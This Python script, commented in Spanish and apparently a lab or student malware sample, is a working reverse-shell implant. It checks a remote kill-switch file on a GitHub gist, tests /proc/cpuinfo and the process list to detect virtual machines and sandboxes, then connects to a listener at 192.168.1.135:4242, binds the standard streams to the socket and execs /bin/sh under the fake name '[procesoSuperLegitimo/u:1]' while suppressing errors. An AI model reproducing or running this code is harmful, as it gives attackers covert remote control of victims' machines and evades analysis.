import requests as r
import requests.exceptions
import os
import socket

# CHECK FICHERO DE CONTROL
def killswitch():
    URL = 'https://gist.githubusercontent.com/apachete24/7202e9ccfa8b5008a12ce38563766081/raw/f2b8cf7f1a9ff353feed5fa142da9cda38cf4bc0/control'

    try:
        web_control = r.get(URL, timeout=5, allow_redirects=False)
        if 'Все еще' in web_control.text:
            print(web_control.text)
            print("Finalizado por el fichero de control")
            return True

        else:
            return False



    except requests.exceptions.RequestException as e:
        print("ERROR al recuperar el fichero de control")
        return True



# CHECK VM
def checkCPU():
    # Comprobacion CPU
    try:
        with open('/proc/cpuinfo', 'r') as file:
            for linea in file:
                # Aquí comprobamos si la cadena 'vendor_id' está en la línea actual
                if 'vendor_id' in linea:
                    if "amd" in linea.lower() or "intel" in linea.lower():
                        return False
                    # el vendor ID no pertenece a una maquina física
                    else:  # no es una VM
                        return True

    # Capturamos cualquier error de SO. Ya sea porque no existe el fichero, faltan permisos...
    except OSError as e:
        print(f"ERROR al leer /proc/cpuinfo: {e}")
        return True
        # "En cualquier otro caso no continuaremos la ejecución" No se ha encontrado el vendor ID.

    return True





def checkVMprocess():
    # Deteccion proceso gestion VMs
    # Para evisar crear subprocesos con llamadas de sistema lo miro directamente en los ficheros
    for proceso in os.listdir("/proc"):

        if not proceso.isdigit():  # si el directorio no es un numero pasamos al siguiente, porque no es de un proceso
            continue

        ruta = f'/proc/{proceso}'
        try:
            # os.stat intenta leer la información básica del directorio
            os.stat(ruta)
            with open(f'{ruta}/status', 'r') as status:
                process_name = status.readline()
                if 'qemu-guest-agent' in process_name:
                    return True

        except FileNotFoundError:
            print("El directorio NO existe.")
            return False

        except PermissionError:
            print(f"Error al acceder al proceso ID={proceso}")
            return False


    return False


def revershell():
    # ip local para pruebas
    IP = "192.168.1.135"
    PORT = 4242

    try:
        # Crear el socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Conectar al listener
        s.connect((IP, PORT))
        # redirigir las entradas y salidas hacia el socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # ejecutar la shell interactiva
        # subprocess.call(["/bin/sh", "-i"])
        args = ["[procesoSuperLegitimo/u:1]", "-i"]
        os.execv("/bin/sh", args)  # lo alojamos en el mismo proceso

    except Exception:
        # si cualquier tipo de excepción la ejecución muere sin mostrar errores
        return -1




if killswitch() or checkCPU() or checkVMprocess():
    exit(0)

revershell()